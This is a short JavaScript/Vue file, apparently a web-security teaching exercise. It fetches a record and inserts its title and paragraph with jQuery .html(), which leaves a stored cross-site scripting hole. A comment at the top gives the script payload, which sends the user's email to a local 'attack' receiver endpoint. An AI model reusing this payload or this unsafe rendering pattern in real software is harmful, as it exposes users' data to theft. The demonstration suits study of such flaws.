// To see the effects of the injection, create a record with a paragraph of:
// <script>
// $.getJSON("http://127.0.0.1:8888/attack/api/receive_user_email", {stolen_email: user_email});
// </script>

var app = function() {

    var self = {};

    Vue.config.silent = false; // show all warnings

    // Extends an array
    self.extend = function(a, b) {
        for (var i = 0; i < b.length; i++) {
            a.push(b[i]);
        }
    };

    self.get_record = function () {
        $.getJSON(apiurl,
            {record_id: self.vue.record_id},
            function (data) {
                $("#record_title").html(data.title);
                $("#record_paragraph").html(data.paragraph);
            }
            )
    };

    // Complete as needed.
    self.vue = new Vue({
        el: "#vue-div",
        delimiters: ['${', '}'],
        data: {
            record_id: ''
        },
        methods: {
            get_record: self.get_record
        }

    });


    return self;
};

var APP = null;

// This will make everything accessible from the js console;
// for instance, self.x above would be accessible as APP.x
jQuery(function(){APP = app();});
